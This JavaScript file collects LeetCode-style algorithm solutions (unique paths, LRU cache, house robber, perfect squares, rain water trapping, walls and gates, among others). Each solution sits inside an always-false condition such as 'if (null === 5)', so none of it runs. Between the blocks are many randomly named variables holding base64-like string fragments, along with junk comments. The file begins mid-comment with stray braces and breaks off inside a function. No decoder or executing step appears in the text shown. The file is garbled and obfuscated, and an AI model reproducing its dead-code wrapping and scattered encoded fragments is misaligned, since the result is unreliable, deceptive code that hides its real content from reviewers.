Follow up for "Unique Paths":

Now consider if some obstacles are added to the grids. How many unique paths would there be?

An obstacle and empty space is marked as 1 and 0 respectively in the grid.

For example,
There is one obstacle in the middle of a 3x3 grid as illustrated below.

[
  [0,0,0],
  [0,1,0],
  [0,0,0]
]
The total number of unique paths is 2.

Note: m and n will be at most 100.


*/
/**
 * @param {number[][]} obstacle
 * @return {number}
 */
var uniquePathsWithObstacles = function(obstacle) {
    var rLen = obstacle.length,
        matrix = [],
        cLen,
        i,
        j;
        
    if (rLen === 0) {
        return 0;    
    }
    
    cLen = obstacle[0].length;
    
    if (obstacle[0][0] === 1) {
        return 0;
    }
    
    for (i = 0; i < rLen; i++) {
        matrix.push(new Array(cLen));
    }
    
    matrix[0][0] = 1;
    for (i = 1; i < cLen; i++) {
        matrix[0][i] = (obstacle[0][i] || !matrix[0][i - 1])? 0 : 1; 
    }
    
    for (i = 1; i < rLen; i++) {
        matrix[i][0] = (obstacle[i][0] || !matrix[i - 1][0])? 0 : 1;
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            if (obstacle[i][j]) {
                matrix[i][j] = 0;
            } else {
                matrix[i][j] = matrix[i - 1][j] + matrix[i][j - 1];
            }
        }
    }
    
    return matrix[rLen - 1][cLen - 1];
};

}

    var uwbwuivn = 'ZEc4Z1lX';
if (null === 5) {
    /**
Design and implement a data structure for Least Recently Used (LRU) cache. It should support the following operations: get and set.

get(key) - Get the value (will always be positive) of the key if the key exists in the cache, otherwise return -1.
set(key, value) - Set or insert the value if the key is not already present. When the cache reached its capacity, it should invalidate the least recently used item before inserting a new item.
*/
class Node {
    constructor(key, val) {
        this.key = key;
        this.val = val;
        this.next = null;
        this.prev = null;
    }
}
/**
 * @constructor
 */
var LRUCache = function(capacity) {
    this.list = null;
    this.map = new Map();
    this.head = null;
    this.tail = null;
    this.size = capacity;
    this.curSize = 0;
};

/**
 * @param {number} key
 * @returns {number}
 */
LRUCache.prototype.get = function(key) {
    if (!this.map.get(key)) {
        return -1;
    }
    
    let node = this.map.get(key);
    
    if (node === this.head) {
        return node.val;
    }
    
    // remove node from list
    if (node === this.tail) {
        this.tail.prev.next = null;
        this.tail = this.tail.prev;
    } else {
        node.prev.next = node.next;
        node.next.prev = node.prev;
    }
    
    // insert node to head
    node.next = this.head;
    this.head.prev = node;
    this.head = node;
    
    return node.val;
};

/**
 * @param {number} key
 * @param {number} value
 * @returns {void}
 */
LRUCache.prototype.set = function(key, value) {
    let newNode = new Node(key, value);
    
    if (this.curSize === 0) {
        this.head = newNode;
        this.tail = newNode;
        this.curSize++;
    } else {
        newNode.next = this.head;
        this.head.prev = newNode;
        this.head = newNode;
        this.curSize++;
    }
    
    // update
    if (this.map.get(key)) {
        let oldNode = this.map.get(key);
        
        if (oldNode === this.tail) {
            this.tail = this.tail.prev;
            this.tail.next = null;
        } else {
            oldNode.prev.next = oldNode.next;
            oldNode.next.prev = oldNode.prev;
        }
        
        this.curSize--;
        this.map.set(key, newNode);
    } else {
        if (this.curSize > this.size) {
            //delete tail
            this.map.delete(this.tail.key);
            this.tail = this.tail.prev;
            this.tail.next = null;
            this.curSize--;
        }
        
        this.map.set(key, newNode);
    }
};

}

    var dwozsnikpm = 'cfvhOek';
if (Array.isArray(8)) {
    /**
Note: This is an extension of House Robber.

After robbing those houses on that street, the thief has found himself a new place for his thievery so that he will not get too much attention. This time, all houses at this place are arranged in a circle. That means the first house is the neighbor of the last one. Meanwhile, the security system for these houses remain the same as for those in the previous street.

Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police.
*/
/**
 * @param {number[]} nums
 * @return {number}
 * 因为首尾相连了，所以第一家和最后一家只能抢其中的一家，或者都不抢，那我们这里变通一下，如果我们把第一家和最后一家分别去掉，各算一遍能抢的最大值，然后比较两个值取其中较大的一个即为所求。
 */
var rob = function(nums) {
    var len = nums.length;
    
    if (len === 0) {
        return 0;
    }
    
    if (len === 1) {
        return nums[0];
    }
    
    return Math.max(getMax(0, len - 1, nums), getMax(1, len, nums));
};

function getMax(start, end, nums) {
    var arr = [],
        i;
    
    if (end - start <= 1) {
        return nums[start];
    }
    
    arr[start] = nums[start];
    arr[start + 1] = Math.max(nums[start], nums[start + 1]);
    
    for (i = start + 2; i < end; i++) {
        arr[i] = Math.max(arr[i - 1], arr[i - 2] + nums[i]);
    }
    
    return arr[end - 1];
}

}

// import tbcel number
    var xgrrcckqbnt = 'RjaoI';
    var ocihnu = 'TmpaWE';
    var elpsbolzq = 'JaKCpoGRw';
    var zjydqteklifd = '56SUdS';
if (2 === 11) {
    /**
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    var arr = [],
        i,
        j;
    
    arr[0] = 0;
    
    for (i = 1; i <= n; i++) {
        arr[i] = Number.MAX_VALUE;
    }
    
    for (i = 0; i <= n; i++) {
        for (j = 1; i + j * j <= n; j++) {
            arr[i + j * j] = Math.min(arr[i + j * j], arr[i] + 1);
        }
    }
    
    return arr[n];
};

// SOLUTION 2
/**
 * 根据四平方和定理，任意一个正整数均可表示为4个整数的平方和，其实是可以表示为4个以内的平方数之和，那么就是说返回结果只有1,2,3或4其中的一个，首先我们将数字化简一下，由于一个数如果含有因子4，那么我们可以把4都去掉，并不影响结果，比如2和8,3和12等等，返回的结果都相同，读者可自行举更多的栗子。
 * 还有一个可以化简的地方就是，如果一个数除以8余7的话，那么肯定是由4个完全平方数组成，这里就不证明了，因为我也不会证明，读者可自行举例验证。那么做完两步后，一个很大的数有可能就会变得很小了，大大减少了运算时间，下面我们就来尝试的将其拆为两个平方数之和，如果拆成功了那么就会返回1或2，因为其中一个平方数可能为0. 
 * @param {number} n
 * @return {number}
 */
var numSquares = function(n) {
    while(n % 4 === 0) {
        n /= 4;
    }
    
    if (n % 8 === 7) {
        return 4;
    }
    
    var i,
        j;
    
    // check if it's 1 or 2
    for (i = 0; i * i <= n; i++) {
        j = parseInt(Math.sqrt(n - i * i));
        if (i * i + j * j === n) {
            return (i === 0 || j === 0)? 1 : 2;
        }
    }
    
    return 3;
};

}

    var hekcpuerwsv = 'CNxZPyIs';
    var oirsfzcyjkfw = 'bGRt';
if (3 === 19) {
    /**
Given an array nums, write a function to move all 0's to the end of it while maintaining the relative order of the non-zero elements.

For example, given nums = [0, 1, 0, 3, 12], after calling your function, nums should be [1, 3, 12, 0, 0].

Note:
You must do this in-place without making a copy of the array.
Minimize the total number of operations.
*/

/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var moveZeroes = function(nums) {
    var len = nums.length,
        curIndex = 0,
        i;
    
    for (i = 0; i < len; i++) {
        if (nums[i] === 0) {
            continue;
        }
        
        nums[curIndex] = nums[i];
        curIndex++;
    }
    
    for (i = curIndex; i < len; i++) {
        nums[i] = 0;
    }
};

}

    var vgkrvbnutfr = 'Vbauu';
if (null === 1) {
    /**
Say you have an array for which the ith element is the price of a given stock on day i.

If you were only permitted to complete at most one transaction (ie, buy one and sell one share of the stock), design an algorithm to find the maximum profit.

 * @param {number[]} prices
 * @return {number}
 */
var maxProfit = function(prices) {
    var i,
        length = prices.length,
        low,
        high,
        max = 0,
        cur;
        
    if (length === 0) {
        return 0;
    }
    low = prices[0];
    high = low;
    for (i = 1; i < length; i++) {
        cur = prices[i];
        if (cur > high) {
            high = cur;
        }else if (cur < low) {
            //need to reset low and high in order to make sure you need to buy before you sell
            low = cur;
            high = cur;
        }
        if (high - low > max) {
            max = high - low;
        }
    }
    return max;
};

}

    var zxtxlo = 'VnNiM0';
    var rieieshypdww = 'iIKkC';
if (0.12 && false) {
    /**
Given two arrays of length m and n with digits 0-9 representing two numbers. Create the maximum number of length k <= m + n from digits of the two. The relative order of the digits from the same array must be preserved. Return an array of the k digits. You should try to optimize your time and space complexity.

Example 1:
nums1 = [3, 4, 6, 5]
nums2 = [9, 1, 2, 5, 8, 3]
k = 5
return [9, 8, 6, 5, 3]

Example 2:
nums1 = [6, 7]
nums2 = [6, 0, 4]
k = 5
return [6, 7, 6, 0, 4]

Example 3:
nums1 = [3, 9]
nums2 = [8, 9]
k = 3
return [9, 8, 9]
*/

/**
 * @param {number[]} nums1
 * @param {number[]} nums2
 * @param {number} k
 * @return {number[]}
 */
var maxNumber = function(nums1, nums2, k) {
    var len1 = nums1.length,
        len2 = nums2.length,
        arr1,
        arr2,
        arr,
        result,
        i;
    
    for (i = Math.max(0, k - len2); i <= k && i <= len1; i++) {
        arr1 = getMaxSubArr(nums1, i);
        arr2 = getMaxSubArr(nums2, k - i);
        arr = merge(arr1, arr2);
        
        if (!result) {
            result = arr;
        } else {
            result = getGreaterArr(result, arr);
        }
    }
    
    return result;
};

// return max sub array of size m
function getMaxSubArr(arr, m) {
    var result = [],
        len = arr.length,
        i,
        j = 0; // top of the stack
    
    for (i = 0; i < len; i++) {
        while (j > 0 && (m - j < len - i) && (result[j - 1] < arr[i])) { //can pop item out of stack
            j--;
        }
        
        if (j < m) {
            result[j] = arr[i];
            j++;
        }
    }
    
    return result;
}

//TODO: Integrate getGreaterArr into isGreater function
function getGreaterArr(a, b) {
    var len = a.length,
        i = 0;
        
    while (i < len) {
        if (a[i] < b[i]) {
            return b;
        } else if (a[i] > b[i]) {
            return a;
        }
        
        i++;
    }
    
    return a;
}

function isGreater(a, i, b, j) {
    var len1 = a.length,
        len2 = b.length;
    
    while(i < len1 && j < len2 && a[i] === b[j]) {
        i++;
        j++;
    }
    
    if (i === len1) {
        return false;
    }
    
    if (j === len2) {
        return true;
    }
    
    return a[i] > b[j];
}

function merge(a, b) {
    var len1 = a.length,
        len2 = b.length,
        i = 0,
        j = 0,
        result = [];
        
    while(i < len1 && j < len2) {
        if (isGreater(a, i, b, j)) {
            result.push(a[i]);
            i++;
        } else {
            result.push(b[j]);
            j++;
        }
    }
    
    while (i < len1) {
        result.push(a[i++]);
    }
    
    while (j < len2) {
        result.push(b[j++]);
    }
    
    return result;
}

}

    var pqxripbzs = 'JsY2';
    var jmxolugfutp = 'bexJJjSxg';
    var xabjqnd = 'lCMGIyOXNj';
    var ysdtjcis = 'BcTwKzEG';
    var lrpplyi = 'eTR';
if (Array.isArray(8)) {
    /**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {boolean}
 */
var isValidBST = function(root) {
    return isValidBSTHelper(root, null, null);
};

function isValidBSTHelper(root, min, max) {
    if (root === null) {
        return true;
    }
    
    if ((min !== null && root.val <= min) || (max !== null && root.val >= max)) {
        return false;
    }
    
    return isValidBSTHelper(root.left, min, root.val) && isValidBSTHelper(root.right, root.val, max);
}

}

    var aaopnrlhbwi = 'CNaERi';
    var djiosg = 'LWkc5am';
    var nubhusncp = 'qUOxTiBD';
    var ccxnawlj = 'RXMWxiblF';
    var qsrungi = 'WeVWpKc';
if ('h' === 'N') {
    /**
Given two binary trees, write a function to check if they are equal or not.

Two binary trees are considered equal if they are structurally identical and the nodes have the same value.

 * Definition for binary tree
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */

/**
 * @param {TreeNode} p
 * @param {TreeNode} q
 * @returns {boolean}
 */
var isSameTree = function(p, q) {
    if (!p && !q) {
        return true;
    }
    if (!p || !q) {
        return false;
    }
    if (p.val !== q.val) {
        return false;
    }
    return isSameTree(p.left, q.left)&&isSameTree(p.right, q.right);
};

}

    var cxtzw = '1WVd';
if (7 === 13) {
    /**
The count-and-say sequence is the sequence of integers beginning as follows:
1, 11, 21, 1211, 111221, ...

1 is read off as "one 1" or 11.
11 is read off as "two 1s" or 21.
21 is read off as "one 2, then one 1" or 1211.
Given an integer n, generate the nth sequence.

Note: The sequence of integers will be represented as a string.

 * @param {number} n
 * @return {string}
 */
var countAndSay = function(n) {
    function interpret(s, accum, sum) {
        var times = 1,
            num,
            len = s.length,
            i,
            result = '';
        
        num = s.charAt(0);
        
        for (i = 1; i < len; i++) {
            if (s.charAt(i) !== num) {
                result += times + num;
                num = s.charAt(i);
                times = 1;
            } else {
                times++;
            }
        }
        if (accum === 1) {
            result = '1';
        } else {
            result += times + num;
        }
        if (accum === sum) {
            return result;
        } else {
            return interpret(result, accum + 1, sum);
        }
    }
    return interpret('1', 1, n);
};

}

    var eahebwmafh = 'XdHeoNM';
    var msmejxnmacrjrzo = 'Sa1JYWmx';
    var vfgezguitali = 'ShwewYjYq';
    var ehstmodhqdgiano = 'iblJN';
    var vaubalo = 'zRqtZjmdkj';
// export compile
    var blwqveh = 'VohJjVeEVk';
    var sxokcsaejw = 'YVhOMFp';
    var sqjroyixwug = 'uheS';
    var kxhbqrczlgbmfjy = 'XNWxjaWdp';
    var orxgevoixq = 'VrRcwGmZrT';
    var jjuwri = 'YTJWNVpH';
    var dwoyfocahqas = 'xeKeAdFcK';
    var ycjbqa = 'OTNiaUl';
    var xnrdisyrl = 'ZiGzqeAI';
if (7 instanceof String) {
    /**
Given an unsorted array nums, reorder it such that nums[0] < nums[1] > nums[2] < nums[3]....

Example:
(1) Given nums = [1, 5, 1, 1, 6, 4], one possible answer is [1, 4, 1, 5, 1, 6]. 
(2) Given nums = [1, 3, 2, 2, 3, 1], one possible answer is [2, 3, 1, 3, 1, 2].

Note:
You may assume all input has valid answer.

Follow Up:
Can you do it in O(n) time and/or in-place with O(1) extra space?
*/
/**
 * @param {number[]} nums
 * @return {void} Do not return anything, modify nums in-place instead.
 */
var wiggleSort = function(nums) {
    var len = nums.length,
        temp = [],
        midIndex = parseInt((len + 1) / 2),
        i,
        l,
        r,
        medium;
        
    medium = findKth(0, len - 1, midIndex, nums);
    
    for (i = 0, l = 0, r = len - 1; i < len; i++) {
        if (nums[i] < medium) {
            temp[l++] = nums[i];
        } else if (nums[i] > medium) {
            temp[r--] = nums[i];
        }
    }
    
    while (l < midIndex) {
        temp[l++] = medium;
    }
    
    while (r >= midIndex) {
        temp[r--] = medium;
    }
    
    r = len;
    
    for (i = 0; i < len; i++) {
        nums[i] = (i & 1) === 0? temp[--l] : temp[--r];
    }
};

function findKth(start, end, k, nums) {
    if (start >= end) {
        return nums[end];
    }
    
    var index = partition(start, end, nums),
        count = index - start + 1;
    
    if (count === k) {
        return nums[index];
    }
    
    if (count < k) {
        return findKth(index + 1, end, k - count, nums);
    }
    
    return findKth(start, index - 1, k, nums);
}

function partition(start, end, nums) {
    var val = nums[start],
        i,
        j;
    
    i = start + 1;
    j = end;
    
    while (true) {
        while (nums[i] <= val) {
            i++;
        }
        
        while (nums[j] > val) {
            j--;
        }
        
        if (i >= j) {
            break;
        }
        
        swap(nums, i, j);
    }
    
    swap(nums, j, start);
    
    return j;
}

function swap(nums, i, j) {
    var temp = nums[i];
    
    nums[i] = nums[j];
    nums[j] = temp;
}

}

    var xtwakccxmrv = 'zSUdaM';
if ('x' === 'B') {
    
/**
 * Given an array of integers, every element appears twice except for one. Find that single one.
 * Note:
 * Your algorithm should have a linear runtime complexity. Could you implement it without using extra memory?
 * 
 * @param {number[]} A
 * @return {number}
 */
var singleNumber = function(A) {
    var length = A.length,
        i,
        result = 0;
    if (length === 1) {
        return A[0];
    }
    for (i = 0; i < length; i++) {
        result = result ^ A[i];
    }
    return result;
};

}

    var uiqesxgw = 'MvOb';
    var sqkncz = 'WJtTjBhVzl';
if (0.77 && false) {
    /**
You are a professional robber planning to rob houses along a street. Each house has a certain amount of money stashed, the only constraint stopping you from robbing each of them is that adjacent houses have security system connected and it will automatically contact the police if two adjacent houses were broken into on the same night.

Given a list of non-negative integers representing the amount of money of each house, determine the maximum amount of money you can rob tonight without alerting the police.

 * @param {number[]} nums
 * @return {number}
 */
var rob = function(nums) {
    var len = nums.length,
        result = [],
        i;
    
    if (len === 0) {
        return 0;
    }
    if (len === 1) {
        return nums[0];
    }
    
    result[0] = nums[0];
    result[1] = Math.max(nums[1], nums[0]);
    for(i = 2; i < len; i++) {
        result[i] = Math.max(result[i - 2] + nums[i], result[i - 1]);
    }
    
    return result[len - 1];
};

}

    var tvqvxjta = 'fWQq';
    var tmtdj = '1S0dWM';
    var otijzevrw = 'wAdnDUk';
    var nkkpwcvzeb = 'lpXNTB';
if (null === 3) {
    /**
Given a string s consists of upper/lower-case alphabets and empty space characters ' ', return the length of last word in the string.

If the last word does not exist, return 0.

Note: A word is defined as a character sequence consists of non-space characters only.

For example, 
Given s = "Hello World",
return 5.
*/

/**
 * @param {string} s
 * @return {number}
 */
var lengthOfLastWord = function(s) {
    var arr = s.split(' '),
        len = arr.length,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        if (arr[i] !== '' && arr[i] !== ' ') {
            return arr[i].length;
        }
    }
    
    return 0;  
};

}

    var hcgfgg = 'TUBbidsXaQ';
if (!true && 0) {
    /**
Given a nested list of integers, implement an iterator to flatten it.

Each element is either an integer, or a list -- whose elements may also be integers or other lists.

Example 1:
Given the list [[1,1],2,[1,1]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,1,2,1,1].

Example 2:
Given the list [1,[4,[6]]],

By calling next repeatedly until hasNext returns false, the order of elements returned by next should be: [1,4,6].
*/
/**
 * // This is the interface that allows for creating nested lists.
 * // You should not implement it, or speculate about its implementation
 * function NestedInteger() {
 *
 *     Return true if this NestedInteger holds a single integer, rather than a nested list.
 *     @return {boolean}
 *     this.isInteger = function() {
 *         ...
 *     };
 *
 *     Return the single integer that this NestedInteger holds, if it holds a single integer
 *     Return null if this NestedInteger holds a nested list
 *     @return {integer}
 *     this.getInteger = function() {
 *         ...
 *     };
 *
 *     Return the nested list that this NestedInteger holds, if it holds a nested list
 *     Return null if this NestedInteger holds a single integer
 *     @return {NestedInteger[]}
 *     this.getList = function() {
 *         ...
 *     };
 * };
 */
/**
 * @constructor
 * @param {NestedInteger[]} nestedList
 */
var NestedIterator = function(nestedList) {
    this.stack = nestedList.reverse();
};


/**
 * @this NestedIterator
 * @returns {boolean}
 */
NestedIterator.prototype.hasNext = function() {
    var next,
        i;
    
    while (this.stack.length > 0) {
        next = this.stack[this.stack.length - 1];
        
        if (next.isInteger()) {
            return true;
        }
        
        this.stack.pop();
        
        for (i = next.getList().length - 1; i >= 0; i--) {
            this.stack.push(next.getList()[i]);
        }
    }
    
    return false;
};

/**
 * @this NestedIterator
 * @returns {integer}
 */
NestedIterator.prototype.next = function() {
    return this.stack.pop();
};

/**
 * Your NestedIterator will be called like this:
 * var i = new NestedIterator(nestedList), a = [];
 * while (i.hasNext()) a.push(i.next());
*/

}

    var irhskzogfmzpjw = 'LU0I3Q2lB';
    var cnsqjlaetwx = 'YNaZlDyWoa';
    var zyibahxzeru = 'Z0lDQn';
if (!true && 1) {
    /**
Given a m x n grid filled with non-negative numbers, find a path from top left to bottom right which minimizes the sum of all numbers along its path.

Note: You can only move either down or right at any point in time.
*/
/**
 * @param {number[][]} grid
 * @return {number}
 */
var minPathSum = function(grid) {
    var result = [],
        rowL = grid.length,
        columnL,
        i,
        j;
    
    if (rowL === 0) {
        return result;
    }
    
    columnL = grid[0].length;
    
    for (i = 0; i < rowL; i++) {
        result.push(new Array(columnL));
    }
    
    result[0][0] = grid[0][0];
    
    for (i = 1; i < columnL; i++) {
        result[0][i] = grid[0][i] + result[0][i - 1];
    }
    
    for (i = 1; i < rowL; i++) {
        result[i][0] = grid[i][0] + result[i - 1][0];
    }
    
    for (i = 1; i < rowL; i++) {
        for (j = 1; j < columnL; j++) {
            result[i][j] = Math.min(result[i - 1][j], result[i][j - 1]) + grid[i][j];
        }
    }
    
    return result[rowL - 1][columnL - 1];
};

}

    var enxobl = 'eAcWXf';
    var uzpxbztdezni = 'BaaUFvY';
    var opvamgh = 'pLMTQCtcl';
if (10 instanceof String) {
    /**
Given a non-negative number represented as an array of digits, plus one to the number.

The digits are stored such that the most significant digit is at the head of the list.
*/
/**
 * @param {number[]} digits
 * @return {number[]}
 */
var plusOne = function(digits) {
    var len = digits.length,
        overflow = 1,
        i;
    
    for (i = len - 1; i >= 0; i--) {
        digits[i] = digits[i] + overflow;
        if (digits[i] === 10) {
            overflow = 1;
            digits[i] = 0;
        } else {
            return digits;
        }
    }
    
    if (overflow === 1) {
        digits.unshift(1);
        return digits;
    }
};

}

    var nchpwybsiag = 'VhOU1pYTj';
    var cjmeeyo = 'zuHgQ';
    var oevuzg = 'BjbWx';
    var eblnkavr = 'KdRKUThzsA';
if (null === 2) {
    /**
Given a 2D binary matrix filled with 0's and 1's, find the largest square containing all 1's and return its area.

For example, given the following matrix:

1 0 1 0 0
1 0 1 1 1
1 1 1 1 1
1 0 0 1 0
Return 4.
*/

/**
 * @param {character[][]} matrix
 * @return {number}
 */
var maximalSquare = function(matrix) {
    var lenX = matrix.length,
        area = [],
        temp = [],
        result = 0,
        lenY,
        i,
        j;
    
    if (lenX === 0) {
        return 0;
    }
    
    lenY = matrix[0].length;
    
    // init two dimension array
    for (i = 0; i < lenX; i++) {
        area[i] = [];
    }
    
    // init first column
    for (j = 0; j < lenY; j++) {
        area[0][j] = parseInt(matrix[0][j]);
        result = Math.max(result, area[0][j]);
    }
    
    // init first row
    for (i = 0; i < lenX; i++) {
        area[i][0] = parseInt(matrix[i][0]);
        result = Math.max(result, area[i][0]);
    }
    
    for (i = 1; i < lenX; i++) {
        for (j = 1; j < lenY; j++) {
            area[i][j] = parseInt(matrix[i][j]);
            
            if (area[i][j]) {
                area[i][j] = Math.min(area[i - 1][j - 1], area[i - 1][j], area[i][j - 1]) + 1;
            }
             
            result = Math.max(result, area[i][j]);
        }
    }
    
    return result * result;
};

}

    var pinltreswkitc = 'qZEdWa1U';
    var bdpngyxeon = 'jNXnN';
    var nnzimrtwxvh = 'yaH';
    var eikmqpxq = 'zllgkhU';
    var tascpmdgtas = 'ZjblJqZFh';
if (!true && 0) {
    /**
Given a 2D board containing 'X' and 'O', capture all regions surrounded by 'X'.

A region is captured by flipping all 'O's into 'X's in that surrounded region.

For example,
X X X X
X O O X
X X O X
X O X X
After running your function, the board should be:

X X X X
X X X X
X X X X
X O X X
*/

/**
 * @param {character[][]} board
 * @return {void} Do not return anything, modify board in-place instead.
 */
var solve = function(board) {
    if (board === null) {
        return;
    }
    
    var rowL = board.length,
        columnL,
        i,
        j;
    
    if (rowL <= 1) {
        return;
    }
    
    columnL = board[0].length;
    
    // visit borders
    for (i = 0; i < rowL; i++) {
        visit(board, i, 0, rowL, columnL);
        visit(board, i, columnL - 1, rowL, columnL);
    }
    
    // visit borders
    for (i = 1; i < columnL - 1; i++) {
        visit(board, 0, i, rowL, columnL);
        visit(board, rowL - 1, i, rowL, columnL);
    }
    
    // flip all 'O' to 'X' and flip all 'Y' to 'O'
    for (i = 0; i < rowL; i++) {
        for (j = 0; j <columnL; j++) {
            if (board[i][j] === 'O') {
                board[i][j] = 'X';
            } else if (board[i][j] === 'Y') {
                board[i][j] = 'O';
            }
        }
    }
};

// flip connected 0 to 'Y'
function visit(board, i, j, rowL, columnL) {
    if (i < 0 || j < 0 || i >= rowL || j >= columnL || board[i][j] !== 'O') {
        return;
    }
    
    var queue = [],
        cur,
        row,
        column;
    
    board[i][j] = 'Y';
    queue.push(i * columnL + j);
    
    while(queue.length > 0) {
        cur = queue.pop();
        row = Math.floor(cur / columnL);
        column = cur % columnL;
        
        if (row > 0 && board[row - 1][column] === 'O') {
            queue.push((row - 1)*columnL + column);
            board[row - 1][column] = 'Y';
        }
        
        if (row < rowL -1 && board[row + 1][column] === 'O') {
            queue.push((row + 1)*columnL + column);
            board[row + 1][column] = 'Y';
        }
        
        if (column > 0 && board[row][column - 1] === 'O') {
            queue.push(row * columnL + column - 1);
            board[row][column - 1] = 'Y';
        }
        
        if (column < columnL - 1 && board[row][column + 1] === 'O') {
            queue.push(row * columnL + column + 1);
            board[row][column + 1] = 'Y';
        }
    }
} 

}

    var zlrawkeziz = 'eSsqXA';
if (4 === 18) {
    /**
Given a linked list, return the node where the cycle begins. If there is no cycle, return null.

Follow up:
Can you solve it without using extra space?

 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */

/**
 * @param {ListNode} head
 * @return {ListNode}
 */
var detectCycle = function(head) {
    if (head === null) {
        return null;
    }
    var slow = head,
        fast = head,
        met = false;
    
    while (fast !== null && fast.next !== null) {
        slow = slow.next;
        fast = fast.next.next;
        if (slow === fast) {
            met = true;
            break;
        }
    }
    
    if (met) {
        fast = head;
        while (fast !== slow) {
            fast = fast.next;
            slow = slow.next;
        }
        return fast;
    } else {
        return null;
    }
};

}

    var qjpcbiqm = 'Rb1pYWm';
    var mifwxhwwndm = 'SNinKEkMYH';
if (null === 2) {
    /**
Suppose a sorted array is rotated at some pivot unknown to you beforehand.

(i.e., 0 1 2 4 5 6 7 might become 4 5 6 7 0 1 2).

You are given a target value to search. If found in the array return its index, otherwise return -1.

You may assume no duplicate exists in the array.
*/
/**
 * @param {number[]} nums
 * @param {number} target
 * @return {number}
 */
var search = function(nums, target) {
    var len = nums.length,
        start = 0,
        end = len - 1,
        mid;
        
    while (start <= end) {
        mid = Math.floor((start + end) / 2);
        
        if (nums[mid] === target) {
            return mid;
        } else if (nums[start] <= nums[mid]) {// left side sorted
            if (nums[mid] > target && nums[start] <= target) {
                // nums[mid] !== target, can safely do end = mid - 1
                end = mid - 1;
            } else {
                start = mid + 1;
            }
        } else { // right side sorted
            if (nums[mid] < target && nums[end] >= target) {
                // nums[mid] !== target, can safely do start = mid + 1
                start = mid + 1;
            } else {
                end = mid - 1;
            }
        }
    }
    
    return -1;
};

}

    var lxzenhs = 'xiblFwS1NC';
if (Array.isArray(4)) {
    /**
Given n non-negative integers representing an elevation map where the width of each bar is 1, compute how much water it is able to trap after raining.

For example, 
Given [0,1,0,2,1,0,1,3,2,1,2,1], return 6.


The above elevation map is represented by array [0,1,0,2,1,0,1,3,2,1,2,1]. In this case, 6 units of rain water (blue section) are being trapped. Thanks Marcos for contributing this image!


*/

// add new solution 
/**
 * @param {number[]} height
 * @return {number}
 *
 * Search from left to right and maintain a max height of left and right separately, which is like a one-side wall of partial container. Fix the higher one and flow water from the lower part. For example, if current height of left is lower, we fill water in the left bin. Until left meets right, we filled the whole container.
 */
var trap = function(height) {
    var len = height.length,
        leftMax = 0,
        rightMax = 0,
        left = 0,
        right = len - 1,
        sum = 0;
    
    while (left <= right) {
        if (height[left] <= height[right]) {
            if (height[left] > leftMax) {
                leftMax = height[left];
            } else {
                sum += leftMax - height[left];
            }
            
            left++;
        } else {
            if (height[right] > rightMax) {
                rightMax = height[right];
            } else {
                sum += rightMax - height[right];
            }
            
            right--;
        }
    }
    
    return sum;
};


/**
 * @param {number[]} height
 * @return {number}
 */
var trap = function(height) {
    var len = height.length,
        leftMax = [],
        rightMax = [],
        max,
        sum = 0,
        i;
    
    leftMax[0] = 0;
    rightMax[len - 1] = 0;
    
    for (i = 1; i < len; i++) {
        leftMax[i] = Math.max(leftMax[i - 1], height[i - 1]);
    }
    
    for (i = len - 2; i >= 0; i--) {
        rightMax[i] = Math.max(rightMax[i + 1], height[i + 1]);
    }
    
    for (i = 1; i < len - 1; i++) {
        max = Math.min(leftMax[i], rightMax[i]);
        
        if (max - height[i] > 0) {
            sum += max - height[i];
        }
    }
    
    return sum;
};

}

    var hluoulfjkyt = 'mjIy';
    var wjzdxtbhhooh = 'N0N';
if (!true && 0) {
    /**
Remove all elements from a linked list of integers that have value val.

Example
Given: 1 --> 2 --> 6 --> 3 --> 4 --> 5 --> 6, val = 6
Return: 1 --> 2 --> 3 --> 4 --> 5

Credits:
Special thanks to @mithmatt for adding this problem and creating all test cases.
*/
/**
 * Definition for singly-linked list.
 * function ListNode(val) {
 *     this.val = val;
 *     this.next = null;
 * }
 */
/**
 * @param {ListNode} head
 * @param {number} val
 * @return {ListNode}
 */
var removeElements = function(head, val) {
    var dummyNode = new ListNode(null),
        node;
    
    if (val === null) {
        return head;
    }
    
    dummyNode.next = head;
    node = dummyNode;
    
    while (node.next) {
        if (node.next.val === val) {
            node.next = node.next.next;
        } else {
            node = node.next;
        }
    }
    
    return dummyNode.next;
};

}

    var zxflazoug = 'nhiH';
    var zmkgmdqt = 'pQWdJQ';
if ('false' === true) {
    /**
 You are given a m x n 2D grid initialized with these three possible values.

    -1 - A wall or an obstacle.
    0 - A gate.
    INF - Infinity means an empty room. We use the value 231 - 1 = 2147483647 to represent INF as you may assume that the distance to a gate is less than 2147483647.

Fill each empty room with the distance to its nearest gate. If it is impossible to reach a gate, it should be filled with INF.

For example, given the 2D grid:

INF  -1  0  INF
INF INF INF  -1
INF  -1 INF  -1
  0  -1 INF INF

After running your function, the 2D grid should be:

  3  -1   0   1
  2   2   1  -1
  1  -1   2  -1
  0  -1   3   4
*/

/**
 * @param {number[][]} rooms
 * @return {void} Do not return anything, modify rooms in-place instead.
 */
var wallsAndGates = function(rooms) {
    let queue = [];
    let rowLen = rooms.length;
    const MAX_VALUE = 2147483647;
    if (rowLen === 0) {
        return;
    }
    
    let colLen = rooms[0].length;
    
    for (let i = 0; i < rowLen; i++) {
        for (let j = 0; j < colLen; j++) {
            if (rooms[i][j] === 0) {
                queue.push([i, j]);
            }
        }
    }
    
    while (queue.length > 0) {
        const cur = queue.shift();
        const row = cur[0];
        const col = cur[1];
        const val = rooms[row][col];
        
        if (row + 1 < rowLen && rooms[row + 1][col] === MAX_VALUE) {
            rooms[row + 1][col] = val + 1;
            queue.push([row + 1, col])
        }
        
        if (row - 1 >= 0 && rooms[row - 1][col] === MAX_VALUE) {
            rooms[row - 1][col] = val + 1;
            queue.push([row - 1, col]);
        }
        
        if (col + 1 < colLen && rooms[row][col + 1] === MAX_VALUE) {
            rooms[row][col + 1] = val + 1;
            queue.push([row, col + 1]);
        }
        
